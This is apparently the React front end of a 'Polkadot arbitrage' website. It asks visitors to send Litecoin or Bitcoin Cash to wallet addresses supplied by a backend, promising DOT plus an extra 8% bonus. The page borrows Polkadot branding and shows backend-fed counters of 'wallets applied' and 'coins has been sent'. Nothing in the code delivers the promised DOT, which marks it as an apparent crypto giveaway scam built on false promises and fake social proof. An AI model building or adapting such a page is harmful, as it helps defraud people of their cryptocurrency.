import React, { useEffect, useState } from 'react';
import './App.css';
import AnimatedNumber from 'animated-number-react';
import { Loader, Whisper, Tooltip, Button, Modal, InputGroup, Input } from 'rsuite';
import EmailIcon from '@rsuite/icons/Email';
import 'rsuite/dist/rsuite.min.css';
import qrcode from 'qrcode';
import axios from 'axios';


function App() {
  const [mobile, setMobile] = useState(false);
  const [appliedWallets, setAppliedWallets] = useState(0);
  const [coinsCountdown, setCoinsCountdown] = useState(0);
  const [modalOpenLTC, setModalOpenLTC] = useState(false);
  const [modalOpenBCH, setModalOpenBCH] = useState(false);
  const [modalOpenWaitingForPayment, setModalOpenWaitingForPayment] = useState({wallet: undefined, state: false, coin: undefined});
  const [wallets, setWallets] = useState({LTC: undefined, BCH: undefined});
  const [ourEmail, setOurEmail] = useState('');
  const [customerWallet, setCustomerWallet] = useState('');
  
  const LTCcanvas = React.createRef();
  const BCHcanvas = React.createRef();

  function handleModalClose(){
    setModalOpenLTC(false);
    setModalOpenBCH(false);
    setCustomerWallet('');
  }

  useEffect(()=>{
    setOurEmail('miaw');
    if(window.innerWidth<800)setMobile(true);
    window.addEventListener('resize', ()=>{
      if(window.innerWidth<800)setMobile(true);
      else setMobile(false);
    });
    axios.post('https://polkadot-arbitrage-backend.herokuapp.com/getdata').then(response=>{
      console.log(response.data);
      setCoinsCountdown(response.data.coinsCountdown);
      setAppliedWallets(response.data.walletsApplied);
      setWallets({LTC: response.data.wallets.LTC.address, BCH: response.data.wallets.BCH.address});
      qrcode.toCanvas(document.getElementById('LTCcanvas'), response.data.wallets.LTC.address, err=>{if(err)console.log(err)});
      qrcode.toCanvas(document.getElementById('BCHcanvas'), response.data.wallets.BCH.address, err=>{if(err)console.log(err)});
    }).catch(err=>console.error(err));
  }, [wallets.LTC, wallets.BCH]);
  return (
    <>
    {!mobile?(
        <div className={mobile?'MobileApp':'App'}>
        <Modal open={modalOpenWaitingForPayment.state} onClose={()=>{
          setModalOpenWaitingForPayment(false);
        }} >
          <Modal.Header>
            <Modal.Title>Waiting for payment <Loader /></Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <h5><span>{modalOpenWaitingForPayment.coin}</span> wallet: {modalOpenWaitingForPayment.wallet}</h5>
            {/* <InputGroup style={{ width: 400, marginTop: 20 }} >
              <InputGroup.Addon>DOT</InputGroup.Addon>
              <Input placeholder='Your DOT(Polkadot) wallet address' />
            </InputGroup> */}
            <p style={{ marginTop: 20 }} >* Your Dot wallet will be credited after payment.</p>
          </Modal.Body>
          <Modal.Footer>
            <Button onClick={()=>{
              setModalOpenWaitingForPayment(false);
            }} style={{background: '#e6007a'}} appearance="primary">
              Ok
            </Button>
            {/* <Button onClick={()=>{
              setModalOpenWaitingForPayment(false);
            }} appearance="subtle">
              Cancel
            </Button> */}
          </Modal.Footer>
        </Modal>
        <Modal open={modalOpenLTC} onClose={handleModalClose} >
          <Modal.Header>
            <Modal.Title>LTC to DOT + 8%</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <h5>LTC wallet: {wallets.LTC}</h5>
            <InputGroup style={{ width: 400, marginTop: 20 }} >
              <InputGroup.Addon>DOT</InputGroup.Addon>
              <Input placeholder='Your DOT(Polkadot) wallet address' onChange={text=>setCustomerWallet(text)} />
            </InputGroup>
            <h6 style={{ marginTop: 20 }} >* Please enter a valid wallet address</h6>
          </Modal.Body>
          <Modal.Footer>
            <Button onClick={()=>{
              if(customerWallet.length<10){
                alert('Enter a valid wallet address!');
              } else {
                handleModalClose();
                setModalOpenWaitingForPayment({...modalOpenWaitingForPayment, wallet: wallets.LTC, coin: 'LTC', state: true});
              }
            }} style={{background: '#e6007a'}} appearance="primary">
              Ok
            </Button>
            <Button onClick={handleModalClose} appearance="subtle">
              Cancel
            </Button>
          </Modal.Footer>
        </Modal>
        <Modal open={modalOpenBCH} onClose={handleModalClose} >
          <Modal.Header>
            <Modal.Title>BCH to DOT + 8%</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <h5>BCH wallet: {wallets.BCH}</h5>
            <InputGroup style={{ width: 400, marginTop: 20 }} >
              <InputGroup.Addon>DOT</InputGroup.Addon>
              <Input placeholder='Your DOT(Polkadot) wallet address' onChange={text=>setCustomerWallet(text)} />
            </InputGroup>
            <h6 style={{ marginTop: 20 }} >* Please enter a valid wallet address</h6>
          </Modal.Body>
          <Modal.Footer>
            <Button onClick={()=>{
              if(customerWallet.length<10){
                alert('Enter a valid wallet address!')
              } else {
                handleModalClose();
                setModalOpenWaitingForPayment({...modalOpenWaitingForPayment, wallet: wallets.BCH, coin: 'BCH', state: true});
              }
            }} style={{background: '#e6007a'}} appearance="primary">
              Ok
            </Button>
            <Button onClick={handleModalClose} appearance="subtle">
              Cancel
            </Button>
          </Modal.Footer>
        </Modal>
        <div className={!mobile?'headerLeftMargin':'headerLeftMarginMobile'}></div>
        <div className='middle'>
          <header>
            <div className={!mobile?'logoContainer':'logoContainerMobile'} >
              {/* <img alt='arbitrage' src='/favicon.ico' height='75px' /> */}
              <a href='https://polkadot.network/' className='logo' style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', cursor: 'pointer', textDecoration: 'none' }} >
                <img style={{pointerEvents:'none'}} alt='arbitrage' src='/logo-polkadot.svg' />
                <h4 style={{ pointerEvents: 'none', cursor: 'default', color: 'black' }} >arbitrage</h4>
              </a>
            </div>
            <div className='walletsApplied'><h5 style={{color: 'black', cursor:'default'}} >wallets applied:</h5> <span style={{display:'flex', alignItems:'center'}}>
              {appliedWallets?(<AnimatedNumber value={appliedWallets} formatValue={value => `${Number(value).toFixed()}`} />):(<Loader />)}
            </span></div>
            <div className='ourEmail'>
              <Whisper trigger='click' speaker={(props, ref)=>{
                const { className, left, top, onClose } = props;
                return <Tooltip className={className} style={{left, top}} onClose={onClose} ref={ref} >Copied to clipboard</Tooltip>
              }}>
                <EmailIcon onClick={()=>{navigator.clipboard.writeText(ourEmail)}} style={{fontSize: 50, color: 'black'}} />
              </Whisper>
            </div>
          </header>
          <div style={{ display: 'flex', alignItems: 'center', borderBottom: 'solid 1.5px rgba(218, 226, 227, 1)' }} >
            <img alt='arbitrage' src='/favicon.ico' height='80' style={{borderRadius:'50%'}} />
            <div>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', width: 'fit-content' }} >
                <h4>Polkadot</h4>
              </div>
              <div>2021-10-02</div>
            </div>
          </div>
          <div className="iframeAlign" >
            <iframe width="80%" height="550px" title='polkadotarbitrage' src="https://www.youtube.com/embed/_-k0xkooSlA?rel=0&modestbranding=1&autohide=1&showinfo=0&controls=0" frameBorder="0" allowFullScreen></iframe>
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 50 }} >
            <p style={{ fontSize: '18px', color: 'black', width: '65%' }} >
              We truly believe that decentralized finance will play a pivotal role in the future.
              In order to unlock the mainstream adoption of Polkadot(DOT), a good wallet is one of the most important gateways for our users.
              We appreciate all wallets who contribute to improving the user experience of Polkadot chain!
            </p>
            <p style={{ fontSize: '18px', color: 'black', width: '65%', marginTop: 20 }} >
              Use the Polkadot Parachain to trade your LTC(Litecoin) or BCH(Bitcoin cash) to DOT(Polkadot), and it generates an extra 8% DOT as your profit, which we committed to a total of 600,000 DOT.
            </p>
            <ul style={{ fontSize: '16px', width: '65%', marginTop: 50 }} >
              <li>The minimum sending volume of BCH is 0.4 BCH, and the minimum sending volume of LTC is 1 LTC.</li>
              <li>The activity will continue until the contract pool of 600,000 DOT is issued.</li>
              <li>After the activity finished, if you send BCH or LTC to the Polkadot parachain, your coins will be automatically returned to your wallet and no profit will be generated.</li>
            </ul>
          </div>
          <footer>
            <div style={{display:'flex', alignItems: 'center', height: '100%'}} >
              <h4 style={{color: 'whitesmoke'}} >©2021, Polkadot arbitrage</h4>
            </div>
            <div className='coinsCounter' style={{alignItems: 'center'}} >
              <h5 style={{color: 'whitesmoke', display: 'flex'}} ><span style={{marginRight: 5}} >
                {coinsCountdown?(<AnimatedNumber value={coinsCountdown} formatValue={value => `${Number(value).toFixed()}`} />):(<Loader />)}
              </span>Coins has been sent</h5>
            </div>
          </footer>
        </div>
        <div className={!mobile?'headerRightMargin':'headerRightMarginMobile'}>
          <div className='articles'>
            <h4 style={{ color: 'black', cursor: 'default' }} >Articles</h4>
            <ul>
            <li><a target='_blank' rel='noreferrer' href="https://en.wikipedia.org/wiki/Polkadot_(cryptocurrency)" >Polkadot (cryptocurrency)</a></li>
            <li><a target='_blank' rel='noreferrer' href="https://coinmarketcap.com/currencies/polkadot-new/" >CMC market data</a></li>
            <li style={{width: 350}} ><a target='_blank' rel='noreferrer' href="https://forkast.news/what-is-polkadot-parachain-hottest-chain/" >What is Polkadot and why is it one of the hottest blockchains right now</a></li>
            <li><a target='_blank' rel='noreferrer' href="https://www.cryptonewsz.com/forecast/polkadot-price-prediction/" >Polkadot Price Prediction</a></li>
            </ul>
          </div>
          <div className='walletsContainer'>
            <div onClick={()=>setModalOpenLTC(true)} style={{ width: 200, height: 200, display: 'flex', justifyContent: 'center', alignItems: 'center', border: '2px solid #e6007a', marginTop: 70, borderRadius: 15 }} >
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', pointerEvents: 'none' }} >
                {wallets.LTC?(
                 <canvas ref={LTCcanvas} id='LTCcanvas' ></canvas>
                ):(
                  <Loader size='md' />
                )}
                <h4 style={{ color: '#e6007a' }} >LTC</h4>
              </div>
            </div>
            <div onClick={()=>setModalOpenBCH(true)} style={{ width: 200, height: 200, display: 'flex', justifyContent: 'center', alignItems: 'center', border: '2px solid #e6007a', marginTop: 50,borderRadius: 15 }} >
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', pointerEvents: 'none' }} >
                {wallets.BCH?(
                  <canvas ref={BCHcanvas} id='BCHcanvas' ></canvas>
                ):(
                  <Loader size='md' />
                )}
                <h4 style={{ color: '#e6007a' }} >BCH</h4>
              </div>
            </div>
          </div>
        </div>
      </div>
    ):(
      <div className={'MobileApp'}>
      <Modal style={{width: '100%'}} open={modalOpenWaitingForPayment.state} onClose={()=>{
          setModalOpenWaitingForPayment(false);
        }} >
          <Modal.Header>
            <Modal.Title>Waiting for payment <Loader /></Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <h6><span>{modalOpenWaitingForPayment.coin}</span> wallet: {modalOpenWaitingForPayment.wallet}</h6>
            {/* <InputGroup style={{ width: 400, marginTop: 20 }} >
              <InputGroup.Addon>DOT</InputGroup.Addon>
              <Input placeholder='Your DOT(Polkadot) wallet address' />
            </InputGroup> */}
            <p style={{ marginTop: 20 }} >* Your Dot wallet will be credited after payment.</p>
          </Modal.Body>
          <Modal.Footer>
            <Button onClick={()=>{
              setModalOpenWaitingForPayment(false);
            }} style={{background: '#e6007a'}} appearance="primary">
              Ok
            </Button>
            {/* <Button onClick={()=>{
              setModalOpenWaitingForPayment(false);
            }} appearance="subtle">
              Cancel
            </Button> */}
          </Modal.Footer>
        </Modal>
        <Modal style={{width: '100%'}} open={modalOpenLTC} onClose={handleModalClose} >
          <Modal.Header>
            <Modal.Title>LTC to DOT + 8%</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <h6>LTC wallet: {wallets.LTC}</h6>
            <InputGroup style={{ width: 330, marginTop: 20 }} >
              <InputGroup.Addon>DOT</InputGroup.Addon>
              <Input placeholder='Your DOT(Polkadot) wallet address' onChange={text=>setCustomerWallet(text)} />
            </InputGroup>
            <h6 style={{ marginTop: 20 }} >* Please enter a valid wallet address</h6>
          </Modal.Body>
          <Modal.Footer>
            <Button onClick={()=>{
              if(customerWallet.length<10){
                alert('Enter a valid wallet address!');
              } else {
                handleModalClose();
                setModalOpenWaitingForPayment({...modalOpenWaitingForPayment, wallet: wallets.LTC, coin: 'LTC', state: true});
              }
            }} style={{background: '#e6007a'}} appearance="primary">
              Ok
            </Button>
            <Button onClick={handleModalClose} appearance="subtle">
              Cancel
            </Button>
          </Modal.Footer>
        </Modal>
        <Modal style={{width: '100%'}} open={modalOpenBCH} onClose={handleModalClose} >
          <Modal.Header>
            <Modal.Title>BCH to DOT + 8%</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <h6>BCH wallet: {wallets.BCH}</h6>
            <InputGroup style={{ width: 330, marginTop: 20 }} >
              <InputGroup.Addon>DOT</InputGroup.Addon>
              <Input placeholder='Your DOT(Polkadot) wallet address' onChange={text=>setCustomerWallet(text)} />
            </InputGroup>
            <h6 style={{ marginTop: 20 }} >* Please enter a valid wallet address</h6>
          </Modal.Body>
          <Modal.Footer>
            <Button onClick={()=>{
              if(customerWallet.length<10){
                alert('Enter a valid wallet address!')
              } else {
                handleModalClose();
                setModalOpenWaitingForPayment({...modalOpenWaitingForPayment, wallet: wallets.BCH, coin: 'BCH', state: true});
              }
            }} style={{background: '#e6007a'}} appearance="primary">
              Ok
            </Button>
            <Button onClick={handleModalClose} appearance="subtle">
              Cancel
            </Button>
          </Modal.Footer>
        </Modal>
      {/* <div className={'headerLeftMarginMobile'}></div> */}
      <div className='middle'>
        <header>
          <div className={'logoContainerMobile'} >
            {/* <img alt='arbitrage' src='/favicon.ico' height='75px' /> */}
            <a href='https://polkadot.network/' className='logo' style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', cursor: 'pointer', textDecoration: 'none' }} >
              <img style={{pointerEvents:'none'}} alt='arbitrage' src='/logo-polkadot.svg' />
              <h4 style={{ pointerEvents: 'none', cursor: 'default', color: 'black' }} >arbitrage</h4>
            </a>
          </div>
          <div className='walletsApplied'><h5 style={{color: 'black', cursor:'default'}} >wallets applied:</h5> <span style={{display:'flex', alignItems:'center'}}>
            {appliedWallets?(<AnimatedNumber value={appliedWallets} formatValue={value => `${Number(value).toFixed()}`} />):(<Loader />)}
          </span></div>
          {/* <div className='ourEmail'>
            <Whisper trigger='click' speaker={(props, ref)=>{
              const { className, left, top, onClose } = props;
              return <Tooltip className={className} style={{left, top}} onClose={onClose} ref={ref} >Copied to clipboard</Tooltip>
            }}>
              <EmailIcon onClick={()=>{navigator.clipboard.writeText(ourEmail)}} style={{fontSize: 50, color: 'black'}} />
            </Whisper>
          </div> */}
        </header>
        <div style={{ display: 'flex', alignItems: 'center', borderBottom: 'solid 1.5px rgba(218, 226, 227, 1)' }} >
          <img alt='arbitrage' src='/favicon.ico' height='80' style={{borderRadius:'50%'}} />
          <div>
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', width: 'fit-content' }} >
              <h4>Polkadot</h4>
            </div>
            <div>2021-10-02</div>
          </div>
        </div>
        <div className="iframeAlign" >
          <iframe width="98%" height="290px" title='polkadotarbitrage' src="https://www.youtube.com/embed/_-k0xkooSlA?rel=0&modestbranding=1&autohide=1&showinfo=0&controls=0" frameBorder="0" allowFullScreen></iframe>
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 50 }} >
          <p style={{ fontSize: '16px', color: 'black', width: '90%' }} >
            We truly believe that decentralized finance will play a pivotal role in the future.
            In order to unlock the mainstream adoption of Polkadot(DOT), a good wallet is one of the most important gateways for our users.
            We appreciate all wallets who contribute to improving the user experience of Polkadot chain!
          </p>
          <p style={{ fontSize: '16px', color: 'black', width: '90%', marginTop: 20 }} >
            Use the Polkadot Parachain to trade your LTC(Litecoin) or BCH(Bitcoin cash) to DOT(Polkadot), and it generates an extra 8% DOT as your profit, which we committed to a total of 600,000 DOT.
          </p>
          <div className={'walletsContainerMobile'} style={{marginTop: 20, display: 'flex', justifyContent: 'space-around', width: '55%'}} >
            <Button appearance='primary' onClick={()=>setModalOpenLTC(true)} style={{background: '#e6007a'}} >LTC</Button>
            <Button appearance='primary' onClick={()=>setModalOpenBCH(true)} style={{background: '#e6007a'}} >BCH</Button>
          </div>
          <ul style={{ fontSize: '14px', width: '86%', marginTop: 30 }} >
            <li>The minimum sending volume of BCH is 0.4 BCH, and the minimum sending volume of LTC is 1 LTC.</li>
            <li>The activity will continue until the contract pool of 600,000 DOT is issued.</li>
            <li>After the activity finished, if you send BCH or LTC to the Polkadot parachain, your coins will be automatically returned to your wallet and no profit will be generated.</li>
          </ul>
        </div>
        <div className='articles articlesMobile'>
          <h4 style={{ color: 'black', cursor: 'default' }} >Articles</h4>
          <ul>
          <li><a target='_blank' rel='noreferrer' href="https://en.wikipedia.org/wiki/Polkadot_(cryptocurrency)" >Polkadot (cryptocurrency)</a></li>
          <li><a target='_blank' rel='noreferrer' href="https://coinmarketcap.com/currencies/polkadot-new/" >CMC market data</a></li>
          <li style={{width: 350}} ><a target='_blank' rel='noreferrer' href="https://forkast.news/what-is-polkadot-parachain-hottest-chain/" >What is Polkadot and why is it one of the hottest blockchains right now</a></li>
          <li><a target='_blank' rel='noreferrer' href="https://www.cryptonewsz.com/forecast/polkadot-price-prediction/" >Polkadot Price Prediction</a></li>
          </ul>
        </div>
        <footer style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }} >
          <div style={{display:'flex', alignItems: 'center', height: '50%'}} >
            <h5 style={{color: 'whitesmoke'}} >©2021, Polkadot arbitrage</h5>
          </div>
          <div className='coinsCounter' style={{alignItems: 'center'}} >
            <h5 style={{color: 'whitesmoke', display: 'flex'}} ><span style={{marginRight: 5}} >
              {coinsCountdown?(<AnimatedNumber value={coinsCountdown} formatValue={value => `${Number(value).toFixed()}`} />):(<Loader />)}
            </span>Coins has been sent</h5>
          </div>
        </footer>
      </div>
      {/* <div className={!mobile?'headerRightMargin':'headerRightMarginMobile'}>
        
        <div className='walletsContainer'>
          <div>
            <canvas ref={LTCcanvas} id='LTCcanvas' ></canvas>
          </div>
          <div>
            <canvas ref={BCHcanvas} id='BCHcanvas' ></canvas>
          </div>
        </div>
      </div> */}
    </div>
    )}
    
    </>
  );
}

export default App;
